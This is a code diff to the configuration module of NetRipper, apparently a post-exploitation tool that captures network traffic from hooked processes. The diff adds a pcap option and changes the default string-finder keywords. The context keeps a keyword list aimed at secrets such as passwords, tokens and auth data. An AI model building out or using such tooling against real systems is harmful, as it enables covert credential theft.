@@ -9,12 +9,13 @@ string DynConfig::s_sPlainText    = "false";
 string DynConfig::s_sDataLimit    = "65535";
 string DynConfig::s_sStringFinder = "user,login,pass,config,token,secret,auth";
 string DynConfig::s_sProcessList = "";
+bool DynConfig::s_bEnablePcap = false;
 
 // Default settings
 
 string DynConfig::s_sConfigurationString = 
-	"<NetRipper><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>DEFAULT</stringfind"
-	"er><data_path>TEMP</data_path><processes></processes></NetRipper>-----------------------------------"
+	"<NetRipper><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>GET,POST</stringfind"
+	"er><data_path>TEMP</data_path><processes></processes><pcap>false</pcap></NetRipper>-----------------"
 	"----------------------------------------------------------------------------------------------------"
 	"----------------------------------------------------------------------------------------------------"
 	"----------------------------------------------------------------------------------------------------"
@@ -33,6 +34,7 @@ void DynConfig::Init()
 	s_sDataLimit    = Utils::GetStringBetween(s_sConfigurationString, "<datalimit>", "</datalimit>");
 	s_sStringFinder = Utils::GetStringBetween(s_sConfigurationString, "<stringfinder>", "</stringfinder>");
 	s_sProcessList  = Utils::GetStringBetween(s_sConfigurationString, "<processes>", "</processes>");
+	s_bEnablePcap = Utils::GetStringBetween(s_sConfigurationString, "<pcap>", "</pcap>").compare("true") == 0;
 }
 
 // Get plaintext plugin config
@@ -61,6 +63,11 @@ string DynConfig::GetStringFinder()
 string DynConfig::GetProcessList()
 {
 	return s_sProcessList;
+}
+
+bool DynConfig::GetEnablePcap()
+{
+	return s_bEnablePcap;
 }
 
 // Get the data path, create folder if it does not exists
